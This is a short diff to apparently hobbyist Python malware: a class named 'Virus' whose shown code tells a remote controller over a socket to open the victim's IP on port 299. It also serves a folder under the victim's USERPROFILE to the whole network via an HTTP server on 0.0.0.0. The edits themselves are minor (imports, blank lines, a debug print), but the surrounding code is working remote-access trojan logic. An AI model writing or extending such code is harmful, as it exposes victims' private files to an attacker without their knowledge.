@@ -1,3 +1,4 @@
+import http.server
 import os
 import socket
 import http
@@ -5,7 +6,7 @@ import socketserver
 import _thread
 import time
 from urllib.request import urlretrieve
-
+from http import *
 
 socket_con = socket.socket()
 
@@ -103,12 +104,15 @@ class Virus:
                 pass
             
     def show_dir(self):
+                
 
                 Handler = http.server.SimpleHTTPRequestHandler
                 desktop = os.path.join(os.path.join(os.environ['USERPROFILE']),
                         self.data[1])
                 os.chdir(desktop)            
+                
                 with socketserver.TCPServer(("0.0.0.0", 299), Handler) as self.httpd:
+                   
                     self.httpd.serve_forever()
                     self.dir = False
     def main(self):
@@ -126,6 +130,7 @@ class Virus:
                 self.con.send("\n[Notice] -> go to browser and type ip with port 299".encode())
                 
                 if self.dir == False:
+                    print("s")
                     self.show_dir()
                     self.dir = True
                     
